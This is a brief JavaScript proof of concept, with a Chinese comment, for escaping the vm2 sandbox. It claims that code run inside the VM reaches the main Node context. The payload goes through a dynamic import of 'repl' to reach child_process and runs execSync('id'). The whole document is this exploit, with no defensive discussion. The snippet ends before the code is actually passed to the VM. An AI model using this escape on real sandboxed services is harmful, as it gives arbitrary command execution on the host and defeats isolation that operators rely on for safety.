const { VM } = require('vm2');
// 只要在 vm 内部执行下面这段，就能跑出 vm，等同于主 Node 上下文：
const code = `
  import('repl').then(x => x.start.call({}).context.process.mainModule.require('child_process').execSync('id').toString())
`;
